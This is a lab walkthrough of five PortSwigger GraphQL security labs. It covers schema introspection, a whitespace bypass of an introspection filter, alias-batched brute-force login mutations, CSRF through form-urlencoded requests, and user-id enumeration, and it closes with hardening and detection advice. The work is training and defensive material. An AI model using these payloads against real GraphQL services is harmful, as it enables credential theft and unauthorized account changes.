# PortSwigger GraphQL API Vulnerabilities 1-5 — Schema Is an Attack Surface

This is a consolidated walkthrough of the five PortSwigger GraphQL API vulnerability labs.

All labs were completed in the authorized Web Security Academy environment. The main lesson is that GraphQL security depends on schema exposure, resolver authorization, transport rules, and execution semantics. A single endpoint can still have many security boundaries.

## 1. Overview

| # | Lab | Flaw | Core idea |
|---|-----|------|-----------|
| 1 | Accessing private GraphQL posts | private field exposed by schema | introspect `BlogPost`, query missing post id with `postPassword` |
| 2 | Accidental exposure of private fields | credential fields exposed by user resolver | introspect `getUser`, enumerate ids, log in as administrator |
| 3 | Finding a hidden endpoint | hidden endpoint and regex-based introspection block | discover `/api`, use `__schema` plus whitespace to bypass the filter |
| 4 | Bypassing brute force protections | rate limit counts requests, not aliases | put many aliased `login` mutations into one operation |
| 5 | CSRF over GraphQL | endpoint accepts form-urlencoded simple requests | convert email-change mutation into a cross-site form POST |

## 2. Triage model

For a GraphQL target:

1. Find endpoints: `/graphql`, `/api/graphql`, `/api`, GET and POST.
2. Send a universal query:

```graphql
query { __typename }
```

3. Try introspection:

```graphql
{ __schema { types { name fields { name } } } }
```

4. Save the schema and inspect queries, mutations, arguments, object types, and sensitive fields.
5. Test resolver authorization at field, object, and mutation level.
6. Test transport behavior: GET, form-urlencoded, batching, and aliases.

## 3. Schema exposure

The private-post lab leaks an extra `BlogPost` field:

```graphql
query getBlogPost($id: Int!) {
  getBlogPost(id: $id) {
    id
    title
    postPassword
  }
}
```

The public post list skips id `3`, so querying that id with `postPassword` reveals the lab password.

The private-field lab exposes a `getUser` query returning credential fields by id. Introspection reveals the query; id enumeration reveals the administrator account; logging in as administrator allows deletion of `carlos`.

These are resolver authorization failures. The schema advertised fields that the current user should not be able to read.

## 4. Hidden endpoints and weak introspection blocks

The hidden endpoint lab responds to:

```http
GET /api?query=query{__typename}
```

with:

```json
{"data":{"__typename":"query"}}
```

Introspection is blocked by a brittle pattern such as `__schema{`. GraphQL allows whitespace, so this remains valid while avoiding the filter:

```graphql
query IntrospectionQuery {
  __schema
  {
    queryType { name }
    mutationType { name }
    types { name }
  }
}
```

The recovered schema exposes `getUser` and `deleteOrganizationUser`. Enumerate the target user id, then call the deletion mutation.

## 5. Alias batching and CSRF

GraphQL aliases let one HTTP request contain many login attempts:

```graphql
mutation {
  bruteforce0: login(input: {username: "carlos", password: "123456"}) {
    token
    success
  }
  bruteforce1: login(input: {username: "carlos", password: "password"}) {
    token
    success
  }
}
```

If the rate limiter counts only HTTP requests, one operation bypasses the intended limit. The response identifies the successful alias via `success: true`.

The CSRF lab accepts GraphQL mutations as `application/x-www-form-urlencoded`:

```text
query=<urlencoded mutation>&operationName=changeEmail&variables=<urlencoded json>
```

That makes the mutation a browser simple request and enables a cross-site form POST. State-changing GraphQL operations should not be accepted through CSRF-friendly content types without token validation.

## 6. Defense and detection

Hardening:

- disable or authenticate introspection in production;
- avoid regex-only introspection blocking;
- enforce field-level and object-level resolver authorization;
- apply ownership checks to id arguments;
- rate-limit by semantic action, account, username, and mutation count;
- restrict batching and aliases for sensitive mutations;
- require JSON plus CSRF protection for state-changing operations;
- reject GET for mutations.

Detection:

- `__schema`, `__type`, or `IntrospectionQuery` with unusual whitespace or encoding;
- many aliases invoking the same mutation in one operation;
- GraphQL query strings sent to hidden paths such as `/api`;
- low-privilege users requesting password, token, secret, or credential fields;
- form-urlencoded requests to GraphQL endpoints;
- state-changing mutations without CSRF tokens or Origin/Referer validation.

No lab in this series required a Collaborator/OAST channel.
